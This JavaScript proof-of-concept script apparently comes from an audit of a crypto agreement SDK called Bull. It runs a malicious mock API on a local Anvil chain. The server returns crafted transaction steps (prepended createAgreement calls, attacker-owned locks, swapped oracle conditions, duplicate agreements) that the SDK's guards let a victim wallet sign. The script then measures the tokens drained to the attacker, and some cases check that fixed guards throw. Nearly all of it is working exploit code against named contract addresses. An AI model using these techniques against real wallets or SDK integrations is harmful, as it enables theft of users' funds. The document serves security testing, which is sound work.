// ROUND 9 — Team A: single node-runner attempt (SDK verbatim + mock API + fresh Anvil).
// Threat model: malicious Bull API server returns crafted steps; the victim's
// wallet sends them because the SDK guard lets them through. No live POSTs,
// no real funds, throwaway local (anvil default) keys only.
// Usage: 1) anvil --port 8547 --chain-id 4663   2) node run-poc.mjs
import http from "node:http";
import fs from "node:fs";
import {
  createPublicClient, createWalletClient, http as vhttp, defineChain,
  parseAbi, encodeFunctionData, parseUnits, keccak256, encodeAbiParameters,
  toHex, erc20Abi,
} from "viem";
import { privateKeyToAccount } from "viem/accounts";
import { Bull } from "./sdk-live.mjs";

const RPC = "http://127.0.0.1:8547";
const API_PORT = 3001;
const AGREEMENT = "0x84C6D5dAf99BC65ed3A1D26Ca88ffa834D143999";
const ESCROW = "0xd961cA37e339E14e0D3478383a252E218fe7aa4a";
const ZERO = "0x0000000000000000000000000000000000000000";

const chain = defineChain({ id: 4663, name: "Robinhood Chain",
  nativeCurrency: { decimals: 18, name: "ETH", symbol: "ETH" },
  rpcUrls: { default: { http: [RPC] } } });
const victimKey = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80";
const attackerKey = "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d";
const arbiterKey = "0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a"; // anvil account 2; arbiter never transacts
const victim = privateKeyToAccount(victimKey);
const attacker = privateKeyToAccount(attackerKey);
const arbiter = privateKeyToAccount(arbiterKey);
const V = victim.address, A = attacker.address, R = arbiter.address;

const publicClient = createPublicClient({ chain, transport: vhttp(RPC) });
const walletV = createWalletClient({ chain, transport: vhttp(RPC), account: victim });
const walletA = createWalletClient({ chain, transport: vhttp(RPC), account: attacker });

const AGR_FN = parseAbi([
  "function createAgreement((address payee,address asset,uint256 amount,uint64 expiry,bytes32 termsHash,(uint8 kind,address target,bytes data,uint256 value)[] conditions) p,(uint256 feeWei,uint64 expiry,bytes sig) q) payable returns (uint256)",
  "function attest(uint256 id,uint256 index) returns (bool)",
  "function release(uint256 id) returns (bool)",
]);
const LOCKER_ABI = parseAbi([
  "function createLock(address token, uint256 amount, address beneficiary, uint64 start, uint64 cliff, uint64 end, uint64 step) returns (uint256)",
  "function nextId() view returns (uint256)",
  "function getLock(uint256 id) view returns (address token, address beneficiary, uint256 amount, uint64 start, uint64 cliff, uint64 end, uint64 step)",
]);
const AGR_CREATED = parseAbi(["event AgreementCreated(uint256 indexed id, address indexed payer, address indexed payee, address asset, uint256 amount, uint64 expiry, bytes32 termsHash)"]);

let TOKEN, LOCKER, ORACLE;
let scenario = "";
const results = [];
function record(c, ok, detail) { results.push({ case: c, ok, ...detail }); console.log(`[${ok ? "PASS" : "FAIL"}] ${c}`, JSON.stringify(detail)); }

async function rpc(method, params) {
  const r = await fetch(RPC, { method: "POST", headers: { "content-type": "application/json" },
    body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }) });
  const j = await r.json(); if (j.error) throw new Error(method + ": " + JSON.stringify(j.error)); return j.result;
}
const now = async () => Number((await publicClient.getBlock()).timestamp);
const quote = async () => ({ feeWei: 0n, expiry: BigInt((await now()) + 3600), sig: "0x" + "00".repeat(65) });
const agreeCall = (payee, asset, amount, expiry, conds) => encodeFunctionData({ abi: AGR_FN, functionName: "createAgreement",
  args: [{ payee, asset, amount, expiry, termsHash: "0x" + "01".repeat(32), conditions: conds }, null] }).replace(/$/, "");
async function mkAgreeCall(payee, asset, amount, expiry, conds) {
  return encodeFunctionData({ abi: AGR_FN, functionName: "createAgreement",
    args: [{ payee, asset, amount, expiry, termsHash: "0x" + "01".repeat(32), conditions: conds }, await quote()] });
}
const approveCall = (spender, amt) => encodeFunctionData({ abi: erc20Abi, functionName: "approve", args: [spender, amt] });
const tx = (to, data, value = "0") => ({ to, data, value });
const bal = (who) => publicClient.readContract({ address: TOKEN, abi: erc20Abi, functionName: "balanceOf", args: [who] });
const nextAgreementId = async () => BigInt(await publicClient.getStorageAt({ address: AGREEMENT, slot: "0x0" }));

// ---------- mock API (the malicious server) ----------
const server = http.createServer(async (req, res) => {
  const body = await new Promise((r) => { let d = ""; req.on("data", (c) => (d += c)); req.on("end", () => r(d)); });
  const j = body ? JSON.parse(body) : {};
  const send = (o) => { res.writeHead(200, { "content-type": "application/json" }); res.end(JSON.stringify(o)); };
  const t = await now();
  if (req.url === "/api/v1/vesting" && req.method === "POST") {
    const start = BigInt(t), cliff = start, end = start + 365n * 86400n, step = 30n * 86400n;
    const amt = parseUnits("100000", 18);
    if (scenario === "k355") return send({ steps: [
      { transaction: tx(TOKEN, approveCall(AGREEMENT, amt)) },
      { transaction: tx(AGREEMENT, await mkAgreeCall(A, TOKEN, amt, BigInt(t + 30 * 86400), [{ kind: 1, target: A, data: "0x", value: 0n }])) },
      { transaction: tx(TOKEN, approveCall(LOCKER, amt)) },
      { transaction: tx(LOCKER, encodeFunctionData({ abi: LOCKER_ABI, functionName: "createLock", args: [TOKEN, amt, V, start, cliff, end, step] })) },
    ]});
    if (scenario === "k364") return send({ steps: [
      { transaction: tx(TOKEN, approveCall(LOCKER, amt)) },
      { transaction: tx(LOCKER, encodeFunctionData({ abi: LOCKER_ABI, functionName: "createLock", args: [TOKEN, amt, A, start, cliff, end, step] })) },
    ]});
  }
  if (req.url === "/api/v1/agreements" && req.method === "POST") {
    if (scenario === "k357a") return send({ steps: [
      { transaction: tx(TOKEN, approveCall(AGREEMENT, parseUnits("250", 18))) },
      { transaction: tx(AGREEMENT, await mkAgreeCall(A, TOKEN, parseUnits("250", 18), BigInt(t + 72 * 3600), [{ kind: 2, target: ORACLE, data: "0x6d4ce63c", value: 100n }])) },
    ]});
    if (scenario === "k365") return send({ steps: [
      { transaction: tx(TOKEN, approveCall(AGREEMENT, parseUnits("250", 18))) },
      { transaction: tx(AGREEMENT, await mkAgreeCall(A, TOKEN, parseUnits("250", 18), BigInt(t + 72 * 3600), [{ kind: 1, target: R, data: "0x", value: 0n }])) },
    ]});
  }
  if (req.url === "/api/v1/templates" && req.method === "POST") {
    if (scenario === "k356") return send({ steps: [
      { transaction: tx(TOKEN, approveCall(AGREEMENT, parseUnits("500", 18))) },
      { transaction: tx(AGREEMENT, await mkAgreeCall(A, TOKEN, parseUnits("500", 18), BigInt(t + 30 * 86400), [{ kind: 1, target: A, data: "0x", value: 0n }])) },
    ]});
    if (scenario === "k363") return send({ steps: [
      { transaction: tx(TOKEN, approveCall(AGREEMENT, parseUnits("500", 18))) },
      { transaction: tx(AGREEMENT, await mkAgreeCall(A, TOKEN, parseUnits("500", 18), BigInt(t + 30 * 86400), [{ kind: 1, target: R, data: "0x", value: 0n }])) },
      { transaction: tx(TOKEN, approveCall(AGREEMENT, parseUnits("500", 18))) },
      { transaction: tx(AGREEMENT, await mkAgreeCall(A, TOKEN, parseUnits("500", 18), BigInt(t + 30 * 86400), [{ kind: 1, target: A, data: "0x", value: 0n }])) },
    ]});
  }
  if (req.url.startsWith("/api/v1/agreements/") && req.method === "GET") {
    // NOTE: attest() passes the action object itself to #send (not
    // action.transaction), so actions carry to/data/value at top level.
    if (scenario === "k358-create") return send({ conditions: [{ actions: [{ from: V, name: "attest", to: AGREEMENT, value: "0",
      data: await mkAgreeCall(A, TOKEN, parseUnits("250", 18), BigInt(t + 30 * 86400), [{ kind: 1, target: R, data: "0x", value: 0n }]) }] }] });
    if (scenario === "k358-approve") return send({ conditions: [{ actions: [{ from: V, name: "attest", to: TOKEN, value: "0",
      data: approveCall(AGREEMENT, parseUnits("250", 18)) }] }] });
  }
  if (req.url === "/api/v1/settle/1" && req.method === "GET") {
    if (scenario === "k360") return send({ buyerSteps: [{ from: V,
      transaction: tx(ESCROW, encodeFunctionData({ abi: parseAbi(["function fundPayment(uint256 id) payable"]), functionName: "fundPayment", args: [2n] }), "0") }], sellerSteps: [] });
  }
  res.writeHead(404); res.end("{}");
});

// ---------- chain setup ----------
async function setup() {
  const zerofee = "0x" + fs.readFileSync("chain/bytecode/agreement-84c6-zerofee.hex", "utf8").trim().replace(/^0x/, "");
  const escrowHex = "0x" + fs.readFileSync("chain/bytecode/escrow-v3.hex", "utf8").trim().replace(/^0x/, "");
  await rpc("anvil_setCode", [AGREEMENT, zerofee]);
  await rpc("anvil_setStorageAt", [AGREEMENT, "0x9", toHex(1n, { size: 32 })]);
  await rpc("anvil_setStorageAt", [AGREEMENT, "0x0", toHex(1n, { size: 32 })]);
  await rpc("anvil_setCode", [ESCROW, escrowHex]);
  await rpc("anvil_setStorageAt", [ESCROW, "0x5", toHex(1n, { size: 32 })]);
  await rpc("anvil_setStorageAt", [ESCROW, "0x0", toHex(2n, { size: 32 })]);
  // Fabricate escrow deal #1 (Round6Escrow layout, verified vs live deal #1):
  // buyer=victim, seller=attacker, sellToken, 100e18, payToken=ZERO, payAmount=1 ETH, status=1 open.
  const mocks = JSON.parse(fs.readFileSync("chain/out/Mocks.sol/MockERC20.json", "utf8"));
  const lockerJson = JSON.parse(fs.readFileSync("chain/out/Mocks.sol/MockLocker.json", "utf8"));
  const oracleJson = JSON.parse(fs.readFileSync("chain/out/Mocks.sol/AttackerOracle.json", "utf8"));
  // viem 2.x deployContract returns the TX HASH, not the address.
  async function deploy(abi, bytecode) {
    const hash = await walletV.deployContract({ abi, bytecode, args: [] });
    const rc = await publicClient.waitForTransactionReceipt({ hash });
    return rc.contractAddress;
  }
  TOKEN = await deploy(mocks.abi, mocks.bytecode.object);
  LOCKER = await deploy(lockerJson.abi, lockerJson.bytecode.object);
  ORACLE = await deploy(oracleJson.abi, oracleJson.bytecode.object);
  await walletV.writeContract({ address: TOKEN, abi: mocks.abi, functionName: "mint", args: [V, parseUnits("1000000", 18)] });
  const base = keccak256(encodeAbiParameters([{ type: "uint256" }, { type: "uint256" }], [1n, 1n]));
  const b = BigInt(base);
  const slot = (n) => toHex(b + BigInt(n), { size: 32 });
  const addr = (x) => toHex(BigInt(x), { size: 32 });
  const t = await now();
  const packed6 = BigInt(t + 86400) | (0n << 64n) | (0n << 72n) | (1n << 80n) | (BigInt(A) << 88n);
  const packed7 = BigInt(V) | (250n << 160n);
  await rpc("anvil_setStorageAt", [ESCROW, slot(0), addr(V)]);
  await rpc("anvil_setStorageAt", [ESCROW, slot(1), addr(A)]);
  await rpc("anvil_setStorageAt", [ESCROW, slot(2), addr(TOKEN)]);
  await rpc("anvil_setStorageAt", [ESCROW, slot(3), toHex(parseUnits("100", 18), { size: 32 })]);
  await rpc("anvil_setStorageAt", [ESCROW, slot(4), toHex(0n, { size: 32 })]);
  await rpc("anvil_setStorageAt", [ESCROW, slot(5), toHex(parseUnits("1", 18), { size: 32 })]);
  await rpc("anvil_setStorageAt", [ESCROW, slot(6), toHex(packed6, { size: 32 })]);
  await rpc("anvil_setStorageAt", [ESCROW, slot(7), toHex(packed7, { size: 32 })]);
  console.log("setup done. TOKEN", TOKEN, "LOCKER", LOCKER, "ORACLE", ORACLE);
}

async function attestRelease(id, asAttacker = true) {
  const w = asAttacker ? walletA : walletV;
  await w.writeContract({ address: AGREEMENT, abi: AGR_FN, functionName: "attest", args: [BigInt(id), 0n] });
  await w.writeContract({ address: AGREEMENT, abi: AGR_FN, functionName: "release", args: [BigInt(id)] });
}

async function main() {
  await new Promise((r) => server.listen(API_PORT, r));
  await setup();
  const bull = new Bull({ walletClient: walletV, publicClient, baseUrl: `http://127.0.0.1:${API_PORT}` });

  // K-355 lock() prepend: malicious createAgreement before the honest lock step.
  try {
    scenario = "k355";
    const idBefore = await nextAgreementId();
    const lockId = await bull.lock({ token: TOKEN, amount: "100000", beneficiary: V, durationDays: 365, stepDays: 30, locker: LOCKER });
    await attestRelease(idBefore);
    const atkBal = await bal(A), vicBal = await bal(V);
    const lock = await publicClient.readContract({ address: LOCKER, abi: LOCKER_ABI, functionName: "getLock", args: [BigInt(lockId)] });
    record("K-355 lock() prepend", atkBal === parseUnits("100000", 18) && vicBal === parseUnits("1000000", 18) - parseUnits("200000", 18),
      { lockId, attackerStolen: (atkBal / 10n ** 18n).toString(), victimBalance: (vicBal / 10n ** 18n).toString(), lockBeneficiary: lock[1], lockAmount: (lock[2] / 10n ** 18n).toString() });
  } catch (e) { record("K-355 lock() prepend", false, { error: String(e.message || e).slice(0, 300) }); }

  // K-364 lock() wrong-beneficiary: post-tx throw, but the lock already exists for the attacker.
  try {
    scenario = "k364";
    let threw = "";
    try { await bull.lock({ token: TOKEN, amount: "100000", beneficiary: V, durationDays: 365, stepDays: 30, locker: LOCKER }); }
    catch (e) { threw = String(e.message || e); }
    const nextId = await publicClient.readContract({ address: LOCKER, abi: LOCKER_ABI, functionName: "nextId" });
    const lock = await publicClient.readContract({ address: LOCKER, abi: LOCKER_ABI, functionName: "getLock", args: [nextId - 1n] });
    record("K-364 lock() wrong-beneficiary", threw.includes("does not match") && lock[1].toLowerCase() === A.toLowerCase() && lock[2] === parseUnits("100000", 18),
      { threw: threw.slice(0, 200), lockId: (nextId - 1n).toString(), lockBeneficiary: lock[1], lockAmount: (lock[2] / 10n ** 18n).toString() });
  } catch (e) { record("K-364 lock() wrong-beneficiary", false, { error: String(e.message || e).slice(0, 300) }); }

  // K-357a agree() kind-2 oracle swap.
  try {
    scenario = "k357a";
    const before = await bal(A);
    const id = await bull.agree({ payee: A, asset: TOKEN, amount: "250", terms: "deliver", expiryHours: 72,
      conditions: [{ type: "call_gte", target: ORACLE, data: "0x6d4ce63c", value: 100 }] });
    await walletA.writeContract({ address: AGREEMENT, abi: AGR_FN, functionName: "release", args: [BigInt(id)] });
    const after = await bal(A);
    record("K-357a agree() kind-2 swap", after - before === parseUnits("250", 18), { agreementId: id, paid: ((after - before) / 10n ** 18n).toString() });
  } catch (e) { record("K-357a agree() kind-2 swap", false, { error: String(e.message || e).slice(0, 300) }); }

  // K-356 deal() conditions blind spot: attest-by-payee instead of attest-by-arbiter.
  try {
    scenario = "k356";
    const before = await bal(A);
    const id = await bull.deal("arbiter_escrow", { payee: A, asset: TOKEN, amount: "500", arbiter: R, terms: "deliver" });
    await attestRelease(id);
    const after = await bal(A);
    record("K-356 deal() conditions blind spot", after - before === parseUnits("500", 18), { agreementId: id, paid: ((after - before) / 10n ** 18n).toString() });
  } catch (e) { record("K-356 deal() conditions blind spot", false, { error: String(e.message || e).slice(0, 300) }); }

  // K-363 deal() sum > total: two full-total agreements; SDK throws only after both mined.
  try {
    scenario = "k363";
    const before = await bal(A);
    const firstId = await nextAgreementId();
    let threw = "";
    try { await bull.deal("arbiter_escrow", { payee: A, asset: TOKEN, amount: "500", arbiter: R, terms: "deliver" }); }
    catch (e) { threw = String(e.message || e); }
    await attestRelease(firstId + 1n); // the attacker's agreement (second step)
    const after = await bal(A);
    record("K-363 deal() sum > total", threw.includes("more than the amount") && after - before === parseUnits("500", 18),
      { threw: threw.slice(0, 200), attackerAgreementId: (firstId + 1n).toString(), stolen: ((after - before) / 10n ** 18n).toString() });
  } catch (e) { record("K-363 deal() sum > total", false, { error: String(e.message || e).slice(0, 300) }); }

  // K-365 NEGATIVE: agree() wrong payee must throw pre-send, no agreement created.
  try {
    scenario = "k365";
    const idBefore = await nextAgreementId();
    let threw = "";
    try { await bull.agree({ payee: R, asset: TOKEN, amount: "250", terms: "deliver", expiryHours: 72, conditions: [{ type: "attest", by: R }] }); }
    catch (e) { threw = String(e.message || e); }
    const idAfter = await nextAgreementId();
    record("K-365 agree() wrong-payee (negative)", threw.includes("different payee") && idBefore === idAfter,
      { threw: threw.slice(0, 200), nextIdBefore: idBefore.toString(), nextIdAfter: idAfter.toString() });
  } catch (e) { record("K-365 agree() wrong-payee (negative)", false, { error: String(e.message || e).slice(0, 300) }); }

  // K-358 NEGATIVE: attest() must throw pre-send on a smuggled createAgreement step and on an approve step.
  try {
    scenario = "k358-create";
    const idBefore = await nextAgreementId();
    let threw1 = "";
    try { await bull.attest(1); } catch (e) { threw1 = String(e.message || e); }
    scenario = "k358-approve";
    let threw2 = "";
    try { await bull.attest(2); } catch (e) { threw2 = String(e.message || e); }
    const idAfter = await nextAgreementId();
    record("K-358 attest() smuggle (negative)", threw1.includes("expected attest or vote") && threw2.includes("approval") && idBefore === idAfter,
      { threwCreate: threw1.slice(0, 200), threwApprove: threw2.slice(0, 200), nextIdUnchanged: idBefore === idAfter });
  } catch (e) { record("K-358 attest() smuggle (negative)", false, { error: String(e.message || e).slice(0, 300) }); }

  // K-360 NEGATIVE: fund() cross-deal step must throw pre-send (id binding).
  try {
    scenario = "k360";
    let threw = "";
    try { await bull.fund(1); } catch (e) { threw = String(e.message || e); }
    record("K-360 fund() cross-deal (negative)", threw.includes("not the 1 you asked for"), { threw: threw.slice(0, 200) });
  } catch (e) { record("K-360 fund() cross-deal (negative)", false, { error: String(e.message || e).slice(0, 300) }); }

  console.log("\n=== ROUND9-A NODE RUNNER SUMMARY ===");
  console.log(JSON.stringify(results, null, 2));
  const failed = results.filter((r) => !r.ok).length;
  console.log(failed === 0 ? "ALL GREEN" : `${failed} FAILED`);
  server.close();
  process.exit(failed === 0 ? 0 : 1);
}

main().catch((e) => { console.error("RUNNER FATAL", e); server.close(); process.exit(2); });
